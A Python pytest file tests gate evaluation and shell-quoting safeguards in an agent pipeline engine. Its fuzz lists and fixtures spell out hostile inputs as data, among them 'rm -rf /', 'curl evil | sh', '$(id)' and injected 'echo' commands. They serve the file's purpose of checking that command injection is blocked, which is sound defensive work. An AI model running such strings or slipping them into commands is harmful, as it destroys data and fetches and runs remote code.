"""Gates: command, schema, verifier, ``all``/``any`` and the quoting of ``inputs`` (WS-C6, AC7, security S2)."""

from __future__ import annotations

import random
import shlex

import pytest

from agentos.pipelines.fakes import Reply
from agentos.pipelines.gates import (
    GATE_INPUT_INVALID,
    GATE_REF_UNTRUSTED,
    GATE_SHELL_UNSUPPORTED,
    GateCommandError,
    render_command,
)
from agentos.pipelines.ports import CommandResult, VerifierResult

from .engine_support import make_harness
from .helpers import pipeline

HEADER = """\
version: 1
id: teste
name: Teste
budget: {max_tokens: 1000000}
inputs:
  testes: {type: string, default: "pytest -q"}
  arquivo: {type: string, default: "tests/a.py"}
"""


def _gate(body: str, extra: str = "", header: str = HEADER) -> str:
    return pipeline(
        f"""
        - id: verificar
          gate:
        {body}
        {extra}
        """,
        header,
    )


def _indent(text: str, spaces: int = 6) -> str:
    return "\n".join(" " * spaces + line for line in text.strip("\n").splitlines())


def _single(command: str, *, expect: str = "", timeout: str = "") -> str:
    lines = f"all:\n  - command: {command}"
    if expect:
        lines += f"\n    expect: {expect}"
    if timeout:
        lines += f"\n    timeout_seconds: {timeout}"
    return pipeline(
        "- id: verificar\n  gate:\n" + "\n".join("    " + line for line in lines.splitlines()),
        HEADER,
    )


def test_exit_zero_passes_and_other_fails_with_summary(tmp_path) -> None:
    h = make_harness(tmp_path, _single("${{ inputs.testes }}"))
    tail = "x" * 6000 + "ULTIMA-LINHA"
    h.gates.script(CommandResult(1, tail))
    outcome = h.run()
    assert outcome.state == "failed" and outcome.stop_reason == "step_failed"
    row = next(r for r in h.rows() if r.step_id == "verificar")
    assert row.state == "gate_failed"
    output = h.store.load_output("run-1", row.output)["value"]
    first = output["findings"][0]
    assert first["kind"] == "command_failed" and first["exit_code"] == 1
    assert len(first["output_excerpt"]) == 4000 and first["output_excerpt"].endswith("ULTIMA-LINHA")


def test_exit_zero_passes(tmp_path) -> None:
    h = make_harness(tmp_path, _single("${{ inputs.testes }}"))
    assert h.run().state == "succeeded"
    assert h.gates.commands == ["pytest -q"]


@pytest.mark.parametrize(
    ("result", "passes"),
    [
        (CommandResult(1, "falhou"), True),
        (CommandResult(2, "falhou"), True),
        (CommandResult(0, "ok"), False),
        (CommandResult(127, "nao achei"), False),
        (CommandResult(126, "nao executa"), False),
        (CommandResult(None, "", timed_out=True), False),
        (CommandResult(None, "", denied=True), False),
    ],
)
def test_expect_nonzero_only_counts_a_real_test_failure(tmp_path, result, passes) -> None:
    h = make_harness(tmp_path, _single("${{ inputs.testes }}", expect="nonzero"))
    h.gates.script(result)
    assert (h.run().state == "succeeded") is passes


def test_timeout_is_forwarded_and_timeout_fails(tmp_path) -> None:
    h = make_harness(tmp_path, _single("${{ inputs.testes }}", timeout="30"))
    h.gates.script(CommandResult(None, "parcial", timed_out=True))
    outcome = h.run()
    assert h.gates.timeouts == [30]
    assert outcome.state == "failed"
    row = next(r for r in h.rows() if r.step_id == "verificar")
    finding = h.store.load_output("run-1", row.output)["value"]["findings"][0]
    assert finding["timed_out"] is True


def test_permission_denied_is_not_retried(tmp_path) -> None:
    text = _single("${{ inputs.testes }}").replace("budget:", "defaults: {retries: {max: 3, on: [gate_failed]}}\nbudget:")
    h = make_harness(tmp_path, text)
    h.gates.script(CommandResult(None, "", denied=True))
    outcome = h.run()
    assert outcome.state == "failed" and outcome.error_code == "GATE_PERMISSION_DENIED"
    assert len(h.gates.commands) == 1
    assert h.clock.waits == []


def test_gate_failed_is_retried_when_declared(tmp_path) -> None:
    text = _single("${{ inputs.testes }}").replace("budget:", "defaults: {retries: {max: 2, on: [gate_failed]}}\nbudget:")
    h = make_harness(tmp_path, text)
    h.gates.script(CommandResult(1, "flaky"), CommandResult(0, "ok"))
    assert h.run().state == "succeeded"
    assert len(h.gates.commands) == 2
    assert h.clock.waits == [5.0]
    assert [r.state for r in h.rows() if r.step_id == "verificar"] == ["gate_failed", "succeeded"]


ALL_GATE = """\
- id: verificar
  gate:
    all:
      - command: ${{ inputs.testes }}
      - verifier: {policy: cross_family}
"""


def test_all_stops_at_the_first_failure_and_never_calls_the_verifier(tmp_path) -> None:
    h = make_harness(tmp_path, pipeline(ALL_GATE, HEADER))
    h.gates.script(CommandResult(1, "quebrou"))
    outcome = h.run()
    assert outcome.state == "failed"
    assert h.verifier.calls == 0


def test_all_calls_the_verifier_after_the_command_passes(tmp_path) -> None:
    h = make_harness(tmp_path, pipeline(ALL_GATE, HEADER))
    assert h.run().state == "succeeded"
    assert h.verifier.calls == 1
    request = h.verifier.requests[0]
    assert request.policy == "cross_family" and request.trigger_reason == "pipeline"
    assert request.pipeline_run_id == "run-1" and request.step_id == "verificar"


def test_verifier_receives_the_changed_files(tmp_path) -> None:
    h = make_harness(tmp_path, pipeline(ALL_GATE, HEADER))
    h.scope.files = ("src/a.py", "src/b.py")
    h.run()
    assert h.verifier.requests[0].scope_files == ("src/a.py", "src/b.py")


ANY_GATE = """\
- id: verificar
  gate:
    any:
      - command: ${{ inputs.testes }}
      - command: ls
      - command: pwd
"""


def test_any_stops_at_the_first_approval(tmp_path) -> None:
    h = make_harness(tmp_path, pipeline(ANY_GATE, HEADER))
    h.gates.script(CommandResult(1, "nao"), CommandResult(0, "sim"))
    assert h.run().state == "succeeded"
    assert h.gates.commands == ["pytest -q", "ls"]  # `pwd` never ran


def test_any_fails_when_every_item_fails_and_keeps_all_findings(tmp_path) -> None:
    h = make_harness(tmp_path, pipeline(ANY_GATE, HEADER))
    h.gates.script(CommandResult(1, "a"), CommandResult(2, "b"), CommandResult(3, "c"))
    assert h.run().state == "failed"
    row = next(r for r in h.rows() if r.step_id == "verificar")
    findings = h.store.load_output("run-1", row.output)["value"]["findings"]
    assert [f["exit_code"] for f in findings] == [1, 2, 3]


SCHEMA_PIPELINE = """\
- id: plano
  agent: plan
  prompt: planeja
  output_schema: {type: object}
- id: verificar
  gate:
    all:
      - schema:
          step: plano
          json_schema: {type: object, required: [tarefas], properties: {tarefas: {type: array}}}
"""


def test_schema_gate_validates_a_previous_step_output(tmp_path) -> None:
    good = make_harness(tmp_path / "good", pipeline(SCHEMA_PIPELINE, HEADER))
    good.launcher.script("plano", Reply(text="x", structured_output={"tarefas": []}))
    assert good.run().state == "succeeded"
    bad = make_harness(tmp_path / "bad", pipeline(SCHEMA_PIPELINE, HEADER))
    bad.launcher.script("plano", Reply(text="x", structured_output={"outra": 1}))
    outcome = bad.run()
    assert outcome.state == "failed"
    row = next(r for r in bad.rows() if r.step_id == "verificar")
    finding = bad.store.load_output("run-1", row.output)["value"]["findings"][0]
    assert finding["kind"] == "schema_invalid" and "tarefas" in " ".join(finding["errors"])


VERIFIER_GATE = """\
- id: verificar
  gate:
    all:
      - verifier: {pass_on: [pass, inconclusive]}
"""


def test_verifier_passes_when_the_verdict_is_in_pass_on(tmp_path) -> None:
    h = make_harness(tmp_path, pipeline(VERIFIER_GATE, HEADER))
    h.verifier._queue.append(VerifierResult("inconclusive"))
    assert h.run().state == "succeeded"
    h2 = make_harness(tmp_path / "two", pipeline(VERIFIER_GATE, HEADER))
    h2.verifier._queue.append(VerifierResult("fail"))
    assert h2.run().state == "failed"


def test_findings_gather_command_failures_and_proven_verifier_findings(tmp_path) -> None:
    text = pipeline(
        """
        - id: verificar
          gate:
            any:
              - command: ${{ inputs.testes }}
              - verifier: {}
        """,
        HEADER,
    )
    h = make_harness(tmp_path, text)
    h.gates.script(CommandResult(1, "quebrou"))
    rows = (
        {"id": "F1", "severity": "blocker", "claim": "vaza memoria"},
        {"id": "F2", "severity": "major", "claim": "sem teste"},
        {"id": "F3", "severity": "minor", "claim": "nome ruim"},
        {"id": "F4", "severity": "unproven", "claim": "talvez"},
    )
    h.verifier._queue.append(VerifierResult("fail", findings=rows))
    assert h.run().state == "failed"
    row = next(r for r in h.rows() if r.step_id == "verificar")
    findings = h.store.load_output("run-1", row.output)["value"]["findings"]
    assert [f.get("kind") or f["id"] for f in findings] == ["command_failed", "F1", "F2"]


# ------------------------------------------------------------------ quoting (AC7, S2)


def test_whole_value_is_split_into_words_and_each_word_is_quoted() -> None:
    rendered = render_command("${{ inputs.testes }}", {"testes": "pytest; rm -rf x"})
    assert rendered.text == "'pytest;' rm -rf x"
    assert shlex.split(rendered.text) == ["pytest;", "rm", "-rf", "x"]  # the program is `pytest;`, `echo`/`rm` are arguments


def test_whole_value_with_a_normal_command_stays_runnable() -> None:
    assert render_command("${{ inputs.testes }}", {"testes": "pytest -q"}).text == "pytest -q"


def test_value_in_the_middle_is_one_quoted_argument() -> None:
    value = "a b; $(id) `id` \"q\" 'r'\nz"
    rendered = render_command("pytest -q ${{ inputs.arquivo }}", {"arquivo": value})
    assert rendered.text == "pytest -q " + shlex.quote(value)
    assert shlex.split(rendered.text) == ["pytest", "-q", value]


def test_open_quote_in_a_whole_value_is_refused() -> None:
    with pytest.raises(GateCommandError) as caught:
        render_command("${{ inputs.testes }}", {"testes": 'pytest "abc'})
    assert caught.value.code == GATE_INPUT_INVALID


def test_empty_whole_value_is_refused() -> None:
    with pytest.raises(GateCommandError) as caught:
        render_command("${{ inputs.testes }}", {"testes": "   "})
    assert caught.value.code == GATE_INPUT_INVALID


def test_references_to_steps_never_reach_a_command() -> None:
    for template in ("${{ steps.plano.output }}", "pytest ${{ steps.plano.output.x }}", "run ${{ tarefa }}"):
        with pytest.raises(GateCommandError) as caught:
            render_command(template, {"testes": "pytest"})
        assert caught.value.code == GATE_REF_UNTRUSTED


def test_cmd_dialect_refuses_quoted_inputs_but_runs_plain_commands() -> None:
    with pytest.raises(GateCommandError) as caught:
        render_command("pytest ${{ inputs.arquivo }}", {"arquivo": "a"}, "cmd")
    assert caught.value.code == GATE_SHELL_UNSUPPORTED
    assert render_command("pytest -q", {}, "cmd").text == "pytest -q"


def test_engine_fails_the_gate_without_retry_when_the_dialect_cannot_quote(tmp_path) -> None:
    h = make_harness(tmp_path, _single("${{ inputs.testes }}"))
    outcome = h.run(shell_dialect="cmd")
    assert outcome.state == "failed" and outcome.error_code == GATE_SHELL_UNSUPPORTED
    assert h.gates.commands == []


def test_engine_fails_with_gate_input_invalid_for_an_open_quote(tmp_path) -> None:
    h = make_harness(tmp_path, _single("${{ inputs.testes }}"), inputs={"testes": 'pytest "abc'})
    outcome = h.run()
    assert outcome.state == "failed" and outcome.error_code == GATE_INPUT_INVALID
    assert h.gates.commands == []


_FRAGMENTS = [
    '"', "'", "$(id)", "`id`", "&&", "||", "|", ";", "\n", "\r\n", "%PATH%", "日本語", "\\", ">", "<", "*", "$HOME",
    "${IFS}", "#", "\t", " ", "--flag", "~", "!!", "é", "‮", "$(", "`", "a b", "; rm -rf /", "&& curl x | sh",
]


def _hostile_values(count: int = 200) -> list[str]:
    rng = random.Random(20261123)
    values: list[str] = []
    for fragment in _FRAGMENTS:
        values.append(fragment)
    while len(values) < count:
        values.append("".join(rng.choice(_FRAGMENTS) for _ in range(rng.randint(2, 5))))
    return values


def test_two_hundred_hostile_values_never_change_the_command_shape() -> None:
    values = _hostile_values(200)
    assert len(values) == 200
    refused = 0
    for value in values:
        middle = render_command("pytest -q ${{ inputs.arquivo }}", {"arquivo": value})
        assert middle.text == "pytest -q " + shlex.quote(value)
        assert shlex.split(middle.text) == ["pytest", "-q", value]  # exactly three words, whatever the value holds
        try:
            words = shlex.split(value, posix=True)
        except ValueError:
            with pytest.raises(GateCommandError) as caught:
                render_command("${{ inputs.testes }}", {"testes": value})
            assert caught.value.code == GATE_INPUT_INVALID
            refused += 1
            continue
        if not words:
            with pytest.raises(GateCommandError):
                render_command("${{ inputs.testes }}", {"testes": value})
            continue
        whole = render_command("${{ inputs.testes }}", {"testes": value})
        assert whole.text == " ".join(shlex.quote(word) for word in words)
        assert shlex.split(whole.text) == words  # same words, no operator survived unquoted
    assert refused > 0  # the list does contain unbalanced quotes


# ------------------------------------------------------------------ review fixes: quoting (F1, F2)

_INJECTION = "a; echo INJECTED"
_QUOTED_TEMPLATES = [
    "echo '${{ inputs.arquivo }}'",
    'echo "${{ inputs.arquivo }}"',
    "echo 'x ${{ inputs.arquivo }} y'",
    'echo "a $(true) ${{ inputs.arquivo }}"',
    "echo \\${{ inputs.arquivo }}",
    "echo 'abre ${{ inputs.arquivo }}",
    'echo "abre ${{ inputs.arquivo }}',
]


@pytest.mark.parametrize("template", _QUOTED_TEMPLATES)
def test_reference_inside_the_quotes_of_the_template_is_refused_at_run_time(template) -> None:
    """F1: the engine quotes the value itself; a reference the author already put in quotes would break the quoting."""
    with pytest.raises(GateCommandError) as caught:
        render_command(template, {"arquivo": _INJECTION})
    assert caught.value.code == GATE_INPUT_INVALID
    assert "aspas" in caught.value.message


@pytest.mark.parametrize("value", ["$(echo INJECTED_DOUBLE)", "'; echo X; '", "a\"b", "`id`"])
def test_quoted_reference_never_renders_a_command_with_another_shape(value) -> None:
    for template in ("echo '${{ inputs.arquivo }}'", 'echo "${{ inputs.arquivo }}"'):
        with pytest.raises(GateCommandError):
            render_command(template, {"arquivo": value})


def test_quotes_around_literal_text_next_to_a_reference_are_fine() -> None:
    rendered = render_command("pytest -k 'um dois' \"tres\" ${{ inputs.arquivo }} --opt=${{ inputs.arquivo }}", {"arquivo": "a b"})
    assert shlex.split(rendered.text) == ["pytest", "-k", "um dois", "tres", "a b", "--opt=a b"]
    assert rendered.quoted_values == ("a b", "a b")


def test_rendered_command_is_checked_against_the_template_tokens() -> None:
    """F1, last line of defence: whatever the quoting did, the words of the result must be the template's words."""
    from agentos.pipelines.gates import _check_same_words

    value = "a; echo INJECTED"
    # what the old code produced for `echo '${{ inputs.arquivo }}'`: the value's own quotes cancel the template's
    with pytest.raises(GateCommandError) as caught:
        _check_same_words("echo ''a; echo INJECTED''", "echo 'ORINREF0_'", "ORINREF", [value])
    assert caught.value.code == GATE_INPUT_INVALID
    with pytest.raises(GateCommandError):
        _check_same_words("pytest a; echo INJECTED", "pytest ORINREF0_", "ORINREF", [value])
    _check_same_words("pytest " + shlex.quote(value), "pytest ORINREF0_", "ORINREF", [value])  # the honest rendering passes


@pytest.mark.parametrize("template", ["pytest -q ${{ inputs.arquivo }}", "--opt=${{ inputs.arquivo }}", "x${{ inputs.arquivo }}y", "${{ inputs.arquivo }}"])
def test_hostile_values_keep_the_word_count_of_the_template_in_every_shape(template) -> None:
    for value in _hostile_values(200):
        try:
            rendered = render_command(template, {"arquivo": value})
        except GateCommandError:
            continue  # an unbalanced value as a whole command is refused
        tokens = shlex.split(rendered.text)
        if template == "${{ inputs.arquivo }}":
            assert tokens == shlex.split(value)
        else:
            assert len(tokens) == len(shlex.split(template.replace("${{ inputs.arquivo }}", "X")))


def test_real_shell_sees_exactly_the_value_for_every_accepted_shape() -> None:
    """The host shell itself (Git Bash on Windows) receives the value as one argument, never as a second command."""
    import subprocess

    from agentos.host_shell import current_host_shell, shell_argv

    shell = current_host_shell()
    if shell.dialect != "posix":
        pytest.skip("no POSIX shell on this host")
    values = ["a; echo INJECTED", "$(echo INJECTED)", "`echo INJECTED`", "x' ; echo INJECTED ; '", 'q"; echo INJECTED; "', "a b\nc"]
    for template in ("printf '<%s>' ${{ inputs.v }}", "printf '<%s>' --opt=${{ inputs.v }}", "printf '<%s>' pre${{ inputs.v }}post"):
        for value in values:
            argv = shell_argv(render_command(template, {"v": value}).text, shell)
            assert argv is not None
            done = subprocess.run(argv, capture_output=True, text=True, timeout=30, check=False)
            expected = template.split("'")[1].replace("%s", "{}")  # "<{}>"
            piece = template.split("' ", 1)[1].replace("${{ inputs.v }}", value)
            assert done.stdout.replace("\r\n", "\n") == expected.format(piece), (template, value, done.stdout)
            assert "INJECTED" not in done.stdout.replace(value, "") and done.returncode == 0


def test_loader_refuses_a_quoted_input_reference_in_a_gate_command_and_names_the_line() -> None:
    from agentos.pipelines.validator import validate_structure

    for command in ("\"echo '${{ inputs.arquivo }}'\"", "echo \"${{ inputs.arquivo }}\""):
        text = pipeline(f"- id: g\n  gate:\n    all:\n      - command: {command}\n", HEADER)
        definition, report = validate_structure(text)
        assert definition is None
        error = next(item for item in report.errors if "aspas" in item.message)
        assert error.line == next(n for n, line in enumerate(text.splitlines(), 1) if "command:" in line)
        assert "inputs.arquivo" in error.message


def test_loader_still_accepts_quotes_that_are_only_literal_text() -> None:
    from agentos.pipelines.validator import validate_structure

    text = pipeline("- id: g\n  gate:\n    all:\n      - command: pytest -k 'um dois' ${{ inputs.arquivo }}\n", HEADER)
    definition, report = validate_structure(text)
    assert definition is not None, report.errors


def test_engine_fails_the_gate_without_running_it_for_a_quoted_reference(tmp_path) -> None:
    import dataclasses

    from agentos.pipelines.model import CommandGate, Gate

    h = make_harness(tmp_path, _single("${{ inputs.testes }}"))
    step = h.definition.steps[0]
    hostile = dataclasses.replace(step, gate=Gate("all", (CommandGate(command="echo '${{ inputs.arquivo }}'"),)))
    h.definition = dataclasses.replace(h.definition, steps=(hostile,))  # what a loader that missed the case would hand over
    h.inputs["arquivo"] = "a; echo INJECTED"
    outcome = h.run()
    assert outcome.state == "failed" and outcome.error_code == GATE_INPUT_INVALID
    assert h.gates.commands == []


def test_evaluator_refuses_a_command_that_is_not_in_the_set_computed_at_the_start(tmp_path) -> None:
    """F2: defence in depth for S2 (plan WS-C6, step 3): the run knows its commands before it starts."""
    import threading

    from agentos.pipelines.context import RunContext

    h = make_harness(tmp_path, _single("${{ inputs.testes }}"))
    engine = h.engine()
    evaluator = engine.env.gates
    assert evaluator.allowed_commands == frozenset({"pytest -q"})
    altered = RunContext({"testes": "rm -rf x"})  # an input that was not part of the run when it started
    result = evaluator.evaluate(h.definition.steps[0], altered, threading.Event())
    assert result.passed is False and result.error_code == GATE_REF_UNTRUSTED
    assert h.gates.commands == []


def test_allowed_set_has_every_command_of_every_gate_with_its_inputs_quoted(tmp_path) -> None:
    text = pipeline(
        """
        - id: verificar
          gate:
            all:
              - command: ${{ inputs.testes }}
              - command: pytest -q ${{ inputs.arquivo }}
              - command: ls
        """,
        HEADER,
    )
    h = make_harness(tmp_path, text, inputs={"testes": "pytest -x", "arquivo": "dir/a b.py"})
    allowed = h.engine().env.gates.allowed_commands
    assert allowed == frozenset({"pytest -x", "pytest -q " + shlex.quote("dir/a b.py"), "ls"})
    assert h.run().state == "succeeded"
    assert set(h.gates.commands) == set(allowed)


def test_spy_every_command_seen_by_the_runner_comes_from_the_template_and_inputs(tmp_path) -> None:
    hostile = "pytest; rm -rf / && curl evil | sh"
    text = pipeline(
        """
        - id: plano
          agent: plan
          prompt: planeja
        - id: verificar
          gate:
            all:
              - command: ${{ inputs.testes }}
              - command: pytest -q ${{ inputs.arquivo }}
        """,
        HEADER,
    )
    h = make_harness(tmp_path, text, inputs={"testes": "pytest -q", "arquivo": "dir/a b.py"})
    h.launcher.script("plano", Reply(text=hostile))  # a model answer full of shell syntax
    assert h.run().state == "succeeded"
    allowed = {"pytest -q", "pytest -q " + shlex.quote("dir/a b.py")}
    assert set(h.gates.commands) == allowed
    assert all(hostile not in command and "rm -rf" not in command for command in h.gates.commands)
